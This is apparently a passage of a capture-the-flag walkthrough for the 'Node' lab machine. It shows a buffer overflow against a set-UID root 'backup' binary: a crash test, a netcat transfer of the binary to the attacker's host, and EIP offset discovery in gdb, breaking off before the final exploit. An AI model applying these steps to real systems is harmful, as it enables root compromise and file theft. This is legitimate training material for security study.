+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Secure&nbsp;Backup&nbsp;v1.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>_____________________________________________<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#333333;font-weight:400">\_</span>____________________________________________________<span style="color:#ff9d00;font-weight:700">/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#333333;font-weight:400">\_</span>______________________________________<span style="color:#ff9d00;font-weight:700">/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_______________________________________________<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_-<span style="color:#3ad900;font-weight:400">'&nbsp;&nbsp;&nbsp;&nbsp;.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.&nbsp;&nbsp;---&nbsp;`-_<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_-'</span>.-.-.&nbsp;.---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.&nbsp;&nbsp;.-.-.<span style="color:#333333;font-weight:400">`-_<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_-'.-.-.-.&nbsp;.---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`.&nbsp;.-.-.-.`-_<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;_-'.-.-.-.-.&nbsp;.-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----.&nbsp;.-.-.-.-.`</span>-_<br>
+                &nbsp;_-<span style="color:#3ad900;font-weight:400">'.-.-.-.-.-.&nbsp;.---.-.&nbsp;.-----------------------------.&nbsp;.-.---.&nbsp;.---.-.-.-.`-_<br>
+                :-----------------------------------------------------------------------------:<br>
+                `---._.-----------------------------------------------------------------._.---'</span><br>
+                <br>
+                <br>
+                &nbsp;[+]&nbsp;Validated&nbsp;access&nbsp;token<br>
+                &nbsp;[+]&nbsp;Starting&nbsp;archiving&nbsp;<span style="color:#ff9d00;font-weight:700">test</span><br>
+                &nbsp;[<span style="color:#ff9d00;font-weight:700">!</span>]&nbsp;The&nbsp;target&nbsp;path&nbsp;doesn<span style="color:#3ad900;font-weight:400">'t&nbsp;exist</span>
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-8" name="h2-8"></a><strong></strong>
+        <h2><strong>8) backup Buffer Overflow</strong></h2><br>
+        <code>backup</code> is a set-UID binary that runs as root and takes user input in the form of a filename.<br>
+        Check if you can overflow the buffer for the filename by submitting a bunch of <code>A</code>s.<br>
+            <div class="codebox">
+                tom@node<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>backup&nbsp;1&nbsp;45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474&nbsp;$<span style="color:#ff9d00;font-weight:700">(</span>python&nbsp;-c&nbsp;<span style="color:#3ad900;font-weight:400">'print&nbsp;"A"*1000'</span><span style="color:#ff9d00;font-weight:700">)</span><br>
+                [...]<br>
+                &nbsp;[+]&nbsp;Validated&nbsp;access&nbsp;token<br>
+                &nbsp;[+]&nbsp;Starting&nbsp;archiving&nbsp;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+                Segmentation&nbsp;fault&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>core&nbsp;dumped<span style="color:#ff9d00;font-weight:700">)</span>
+            </div>
+        </div><br>
+        <br>
+        A segmentation fault means we've overflowed the buffer!<br>
+        This means we shoudl be able to exploit this binary to get root :)<br>
+        <br>
+        <a id="h3-4" name="h3-4"></a><strong></strong>
+        <h3><strong>8a) Transfer backup</strong></h3><br>
+        You'll want to develop the exploit for the binary on your attacking host.<br>
+        Transfer the backup binary to your attacking machine with netcat.<br>
+        <br>
+        Start a listener which will receive data into a file called <code>backup</code><br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>node#&nbsp;nc&nbsp;-lvnp&nbsp;9003&nbsp;&gt;&nbsp;backup<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9003&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        Transfer the <code>backup</code> binary from Node to your attacking machine.<br>
+            <div class="codebox">
+                tom@node<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;nc&nbsp;-vn&nbsp;10.10.14.18&nbsp;9003&nbsp;&lt;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>backup<br>
+                nc&nbsp;-vn&nbsp;10.10.14.18&nbsp;9003&nbsp;&lt;&nbsp;backup<br>
+                Connection&nbsp;to&nbsp;10.10.14.18&nbsp;9003&nbsp;port&nbsp;[tcp<span style="color:#ff9d00;font-weight:700">/</span>*]&nbsp;succeeded<span style="color:#ff9d00;font-weight:700">!</span>
+            </div>
+        </div><br>
+        <br>
+        Verify the 2 files are the same with <code>md5sum</code><br>
+            <div class="codebox">
+                tom@node<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;md5sum&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>backup<br>
+                f2cd106436c96a80133fcddd06206042&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>backup<br>
+                <br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>node#&nbsp;md5sum&nbsp;backup<br>
+                f2cd106436c96a80133fcddd06206042&nbsp;&nbsp;backup
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-5" name="h3-5"></a><strong></strong>
+        <h3><strong>8b) 32bit or 64bit?</strong></h3><br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>node#&nbsp;rabin2&nbsp;-I&nbsp;backup<br>
+                arch&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86<br>
+                baddr&nbsp;&nbsp;&nbsp;&nbsp;0x8048000<br>
+                binsz&nbsp;&nbsp;&nbsp;&nbsp;15242<br>
+                bintype&nbsp;&nbsp;elf<br>
+                bits&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;32
+            </div>
+        </div><br>
+        <br>
+        <code>backup</code> is 32bit ELF binary.<br>
+        <br>
+        <a id="h3-6" name="h3-6"></a><strong></strong>
+        <h3><strong>8c) Find offset to overwrite EIP</strong></h3><br>
+        Create a cyclic pattern with <code>msf-pattern_create</code><br>
+            <div class="codebox">
+                root@city64<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>Documents#&nbsp;msf-pattern_create&nbsp;-l&nbsp;600<br>
+                Aa0Aa1Aa2Aa3A...
+            </div>
+        </div><br>
+        <br>
+        Run the binary with the cyclic pattern in gdb-peda.<br>
+            <div class="codebox">
+                root@city64<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>Documents#&nbsp;gdb&nbsp;-q&nbsp;backup<br>
+                Reading&nbsp;symbols&nbsp;from&nbsp;backup...<span style="color:#ff9d00;font-weight:700">(</span>no&nbsp;debugging&nbsp;symbols&nbsp;found<span style="color:#ff9d00;font-weight:700">)</span>...done.<br>
+                gdb-peda$&nbsp;r&nbsp;1&nbsp;a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508&nbsp;Aa0Aa1Aa2Aa3A...<br>
+                [----------------------------------registers-----------------------------------]<br>
+                EAX<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;0x27b&nbsp;<br>
+                EBX<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;0xffffcfe0&nbsp;--&gt;&nbsp;0x4&nbsp;<br>
+                ECX<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;0x1&nbsp;<br>
+                EDX<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;0xf7fac890&nbsp;--&gt;&nbsp;0x0&nbsp;<br>
+                ESI<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;0xf7fab000&nbsp;--&gt;&nbsp;0x1d9d6c&nbsp;<br>
+                EDI<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;0xffffcf2f&nbsp;--&gt;&nbsp;0x796500&nbsp;<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">''</span><span style="color:#ff9d00;font-weight:700">)</span><br>
+                EBP<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;0x72413971&nbsp;<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">'q9Ar'</span><span style="color:#ff9d00;font-weight:700">)</span><br>
+                ESP<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;0xffffbf00&nbsp;<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">"Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"</span><span style="color:#ff9d00;font-weight:700">)</span><br>
+                EIP<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;0x31724130&nbsp;<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">'0Ar1'</span><span style="color:#ff9d00;font-weight:700">)</span><br>
+                EFLAGS<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;0x10286&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>carry&nbsp;PARITY&nbsp;adjust&nbsp;zero&nbsp;SIGN&nbsp;<span style="color:#ff9d00;font-weight:700">trap</span>&nbsp;INTERRUPT&nbsp;direction&nbsp;overflow<span style="color:#ff9d00;font-weight:700">)</span><br>
+                [-------------------------------------code-------------------------------------]<br>
+                Invalid&nbsp;<span style="color:#7f0044;font-weight:400">$PC</span>&nbsp;address<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;0x31724130<br>
+                [------------------------------------stack-------------------------------------]<br>
+                0000<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;0xffffbf00&nbsp;<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">"Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"</span><span style="color:#ff9d00;font-weight:700">)</span><br>
+                0004<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;0xffffbf04&nbsp;<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">"r3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"</span><span style="color:#ff9d00;font-weight:700">)</span><br>
+                0008<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;0xffffbf08&nbsp;<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">"4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"</span><span style="color:#ff9d00;font-weight:700">)</span><br>
+                0012<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;0xffffbf0c&nbsp;<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">"Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"</span><span style="color:#ff9d00;font-weight:700">)</span><br>
+                0016<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;0xffffbf10&nbsp;<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">"r7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"</span><span style="color:#ff9d00;font-weight:700">)</span><br>
+                0020<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;0xffffbf14&nbsp;<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">"8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"</span><span style="color:#ff9d00;font-weight:700">)</span><br>
+                0024<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;0xffffbf18&nbsp;<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">"As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"</span><span style="color:#ff9d00;font-weight:700">)</span><br>
+                0028<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;0xffffbf1c&nbsp;<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">"s1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"</span><span style="color:#ff9d00;font-weight:700">)</span><br>
+                [------------------------------------------------------------------------------]<br>
+                Legend<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;code,&nbsp;data,&nbsp;rodata,&nbsp;value<br>
+                Stopped&nbsp;reason<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;SIGSEGV<br>
+                0x31724130&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;??&nbsp;<span style="color:#ff9d00;font-weight:700">()</span><br>
+            </div>
+        </div><br>
+        <br>
